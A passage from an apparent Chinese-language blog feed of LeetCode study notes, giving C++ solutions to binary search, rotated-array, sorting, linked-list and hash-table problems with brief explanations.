target)</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="33-搜索旋转排序数组——有序-二分法O-logn"><a href="#33-搜索旋转排序数组——有序-二分法O-logn" class="headerlink" title="33 搜索旋转排序数组——有序-二分法O(logn)"></a>33 搜索旋转排序数组——有序-二分法O(logn)</h3><p>整数数组 nums 按升序排列，数组中的值 互不相同 。<br>例如，[0,1,2,4,5,6,7] 在下标 3 处经旋转后可能变为 [4,5,6,7,0,1,2] 。<br>给你 旋转后 的数组 nums 和一个整数 target ，如果 nums 中存在这个目标值 target ，则返回它的下标，否则返回 -1 。<br>你必须<strong>设计一个时间复杂度为 O(log n) 的算法解决此问题</strong>。<br><strong>有序想到 二分！！！</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!n) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)   <span class="keyword">return</span> nums[<span class="number">0</span>]==target?<span class="number">0</span>:<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[<span class="number">0</span>]&lt;=nums[mid])&#123;<span class="comment">//左部分 有序</span></span><br><span class="line">                <span class="keyword">if</span>(nums[<span class="number">0</span>]&lt;=target &amp;&amp; target&lt;nums[mid])</span><br><span class="line">                    r = mid<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid]&lt;target &amp;&amp; target&lt;=nums[n<span class="number">-1</span>])</span><br><span class="line">                    l = mid+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span>    </span><br><span class="line">                    r = mid<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="153-寻找旋转排序数组中的最小值-有序-二分O-logn"><a href="#153-寻找旋转排序数组中的最小值-有序-二分O-logn" class="headerlink" title="153 寻找旋转排序数组中的最小值-有序-二分O(logn)"></a>153 寻找旋转排序数组中的最小值-有序-二分O(logn)</h3><p>给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并进行了多次旋转。请你找出并返回数组中的 最小元素 。<br>eg: 原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到：</p>
<pre><code>若旋转 4 次，则可以得到 [4,5,6,7,0,1,2]
若旋转 7 次，则可以得到 [0,1,2,4,5,6,7]
</code></pre>
<p>你必须<strong>设计一个时间复杂度为 O(log n) 的算法解决此问题</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//官方！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findMin</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&lt;nums[r])&#123;</span><br><span class="line">                r = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="215-数组中的第K个最大元素——快排"><a href="#215-数组中的第K个最大元素——快排" class="headerlink" title="215 数组中的第K个最大元素——快排"></a>215 数组中的第K个最大元素——快排</h3><p><strong>数组：求 第k大 元素[n-k]</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//升序序列：第k个最大的元素，倒着第k个元素，[n-k]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">        <span class="keyword">if</span>(l&gt;=r)<span class="comment">//子数组长度是1，终止递归</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//哨兵是 nums[l]</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[j]&gt;=nums[l]) j--;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[i]&lt;=nums[l]) i++;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(nums[i],nums[l]);<span class="comment">//或者swap(nums[j],nums[l])，为了把nums[l]放到合适位置即 i或j</span></span><br><span class="line">        <span class="comment">//递归左右划分</span></span><br><span class="line">        <span class="built_in">quickSort</span>(nums,l,i<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,i+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.<span class="built_in">size</span>()-k];<span class="comment">//倒着第k个元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="148-排序链表——链表归并排序-升序"><a href="#148-排序链表——链表归并排序-升序" class="headerlink" title="148 排序链表——链表归并排序-升序"></a>148 排序链表——链表归并排序-升序</h3><p>【<strong>时间复杂度是 O(nlog⁡n) 的排序算法</strong>】</p>
<ul>
<li>归并排序、堆排序、快速排序</li>
<li>（快速排序的最差时间复杂度是 O(n^2)</li>
<li>最适合<code>链表</code>的排序算法是 <strong>归并排序</strong>。</li>
</ul>
<p><strong>对链表自顶向下归并排序的过程如下：</strong></p>
<pre><code>找到链表的中点，以中点为分界，将链表拆分成两个子链表。【快慢指针】
对两个子链表分别排序
将两个排序后的子链表合并
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//归并排序 sort() merge()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sort</span>(head,<span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">sort</span><span class="params">(ListNode* head, ListNode* tail)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next==tail)&#123;</span><br><span class="line">            head-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//只有head一个结点</span></span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//快慢指针 寻找中间位置</span></span><br><span class="line">        ListNode* slow = head, *fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=tail)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(fast!=tail)</span><br><span class="line">                fast = fast-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *mid = slow;<span class="comment">//中间结点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">merge</span>(<span class="built_in">sort</span>(head,mid),<span class="built_in">sort</span>(mid,tail));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode *head1, ListNode* head2)</span></span>&#123;</span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode *temp = dummyHead, *t1 = head1, *t2 = head2;</span><br><span class="line">        <span class="keyword">while</span>(t1!=<span class="literal">nullptr</span> &amp;&amp; t2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(t1-&gt;val&lt;=t2-&gt;val)&#123;</span><br><span class="line">                temp-&gt;next = t1;</span><br><span class="line">                t1 = t1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                temp-&gt;next = t2;</span><br><span class="line">                t2 = t2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//排完之后，若t1和t2两链表不等长，则必有一个剩余，之间连在temp之后即可</span></span><br><span class="line">        <span class="keyword">if</span>(t1!=<span class="literal">nullptr</span>)</span><br><span class="line">            temp-&gt;next = t1;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t2!=<span class="literal">nullptr</span>)</span><br><span class="line">            temp-&gt;next = t2;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>###</strong> <strong>147 对链表进行插入排序</strong></p>
<p>给定单个链表的头 head ，使用 <code>插入排序</code> 对链表进行排序，并返回 排序后链表的头。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">insertionSortList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//递增排序</span></span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="comment">//引入哑节点是为了便于在 head 节点之前插入节点</span></span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyHead-&gt;next = head;</span><br><span class="line">		<span class="comment">/*下面这两句中*/</span></span><br><span class="line">        ListNode *lastSorted = head;<span class="comment">//有序列表中最好一个结点</span></span><br><span class="line">        ListNode *p=head-&gt;next;<span class="comment">//待插入结点  //这里忘记了 头结点没有 数值</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="comment">//Sorted-&gt;是第一个数，第一个数当然不能是dummyHead</span></span><br><span class="line">            <span class="keyword">if</span>(p-&gt;val&lt;lastSorted-&gt;val)&#123;<span class="comment">//待插结点 小于 前面，从头开始寻找插入位置</span></span><br><span class="line">                ListNode *pre = dummyHead;<span class="comment">//注意这里配合下面的 pre-&gt;next-&gt;val使用</span></span><br><span class="line">                <span class="keyword">while</span>(pre-&gt;next-&gt;val &lt;= p-&gt;val)</span><br><span class="line">                    pre = pre-&gt;next;<span class="comment">//找到前驱</span></span><br><span class="line">                lastSorted-&gt;next= p-&gt;next;</span><br><span class="line">                p-&gt;next=pre-&gt;next;</span><br><span class="line">                pre-&gt;next=p;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                lastSorted = lastSorted-&gt;next;<span class="comment">//待插结点 大于= 前面，不插入，直接将last后移 </span></span><br><span class="line">            &#125;</span><br><span class="line">            p=lastSorted-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>四、哈希表</title>
    <url>/2025/12/03/%E5%9B%9B%E3%80%81%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="四、哈希表"><a href="#四、哈希表" class="headerlink" title="四、哈希表"></a>四、哈希表</h2><ul>
<li>一般哈希表都是用来<strong>快速判断一个元素是否出现集合里 O(n)</strong></li>
<li>当<strong>需要查询一个元素是否出现过</strong>，或者<strong>一个元素是否在集合里</strong>的时候，就要第一时间想到哈希法</li>
<li>哈希法<strong>牺牲了空间换取了时间</strong>，因为我们要使用额外的数组，set或者是map来存放数据，才能实现快速的查找。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;::iterator it=maap.<span class="built_in">begin</span>();it!=maap.<span class="built_in">end</span>();it++)</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;map: &quot;</span>&lt;&lt; (*it).first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; (*it).second &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; endl;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>三种可选结构：</strong></p>
<ul>
<li>数组</li>
<li>set （集合）</li>
<li>map(映射)</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/8dc7a3fbde064bd59796f523b58b2f2f.png"><br><strong>选择：</strong></p>
<ul>
<li>当我们要使用集合来解决哈希问题的时候，优先使用unordered_set，因为它的查询和增删效率是最优的，如果需要集合是有序的，那么就用set，如果要求不仅有序还要有重复数据的话，那么就用multiset</li>
</ul>
<h3 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242 有效的字母异位词"></a>242 有效的字母异位词</h3><p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。<br>注意：若 s 和 t 中每个字符出现的次数都相同，则称 s 和 t 互为字母异位词。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表  maap[s[i]]++;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//长度不同，直接false</span></span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;<span class="comment">//map记录【次数】</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            maap[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;t.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            maap[t[j]]--;</span><br><span class="line">            <span class="comment">//重点</span></span><br><span class="line">            <span class="keyword">if</span>(maap[t[j]]==<span class="number">0</span>)<span class="comment">//两串某字符次数相同</span></span><br><span class="line">                maap.<span class="built_in">erase</span>(t[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maap.<span class="built_in">empty</span>())<span class="comment">//判空：erase后才会清空该元素</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    用数组 record[s[i]-&#x27;a&#x27;]++;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> record[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//26个字母</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 并不需要记住字符a的ASCII，只要求出一个相对数值就可以了</span></span><br><span class="line">            record[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            record[t[i] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;<span class="comment">//遍历数组</span></span><br><span class="line">            <span class="keyword">if</span> (record[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// record数组如果有的元素不为零0，说明字符串s和t 一定是谁多了字符或者谁少了字符。</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// record数组所有元素都为零0，说明字符串s和t是字母异位词</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取巧：排序后直接比较是否相同</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(t.<span class="built_in">begin</span>(),t.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> s==t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383 赎金信"></a>383 赎金信</h3><p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。<br>如果可以，返回 true ；否则返回 false 。<br>magazine 中的每个字符只能在 ransomNote 中【使用一次】。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//哈希  unordered_map&lt;char,int&gt; maap;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canConstruct</span><span class="params">(string ransomNote, string magazine)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">if</span>(magazine.<span class="built_in">size</span>()&lt;ransomNote.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;magazine.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            maap[magazine[i]]++;<span class="comment">//记录 字典字符 次数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ransomNote.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maap.<span class="built_in">count</span>(ransomNote[i]) &amp;&amp; maap[ransomNote[i]] != <span class="number">0</span>)&#123;<span class="comment">//注意是两个条件</span></span><br><span class="line">                maap[ransomNote[i]]--;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组    record[magazine[i]-&#x27;a&#x27;]++;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canConstruct</span><span class="params">(string ransomNote, string magazine)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> record[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">//add</span></span><br><span class="line">        <span class="keyword">if</span> (ransomNote.<span class="built_in">size</span>() &gt; magazine.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; magazine.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 通过recode数据记录 magazine里各个字符出现次数</span></span><br><span class="line">            record[magazine[i]-<span class="string">&#x27;a&#x27;</span>] ++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; ransomNote.<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">            <span class="comment">// 遍历ransomNote，在record里对应的字符个数做--操作</span></span><br><span class="line">            record[ransomNote[j]-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">            <span class="comment">// 如果小于零说明ransomNote里出现的字符，magazine没有</span></span><br><span class="line">            <span class="keyword">if</span>(record[ransomNote[j]-<span class="string">&#x27;a&#x27;</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="217-存在重复元素"><a href="#217-存在重复元素" class="headerlink" title="217 存在重复元素"></a>217 存在重复元素</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    排序：重复元素 位置相邻</span></span><br><span class="line"><span class="comment">    O(N logN)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">containsDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == nums[i+<span class="number">1</span>])<span class="comment">//相邻元素相等 </span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(n)  unordered_set&lt;int&gt; s;</span></span><br><span class="line"><span class="comment">    s.find(x)!=s.end()</span></span><br><span class="line"><span class="comment">    s.count(x)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">containsDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x: nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.<span class="built_in">find</span>(x) != s.<span class="built_in">end</span>())<span class="comment">//找到了，证明有重复</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            s.<span class="built_in">insert</span>(x);<span class="comment">//没找到 则插入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="49-字母异位词分组"><a href="#49-字母异位词分组" class="headerlink" title="49 字母异位词分组"></a>49 字母异位词分组</h3><p>输入: strs = [“eat”, “tea”, “tan”, “ate”, “nat”, “bat”]<br>输出: [ [“bat”],[“nat”,”tan”],[“ate”,”eat”,”tea”] ]</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  哈希表</span></span><br><span class="line"><span class="comment">    unordered_map&lt;string, vector&lt;string&gt;&gt; maap;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = strs.<span class="built_in">size</span>();<span class="comment">//共有n个字符串</span></span><br><span class="line">        unordered_map&lt;string, vector&lt;string&gt;&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            string s = strs[i];<span class="comment">//字符串</span></span><br><span class="line">            <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">            maap[s].<span class="built_in">push_back</span>(strs[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=maap.<span class="built_in">begin</span>();it!=maap.<span 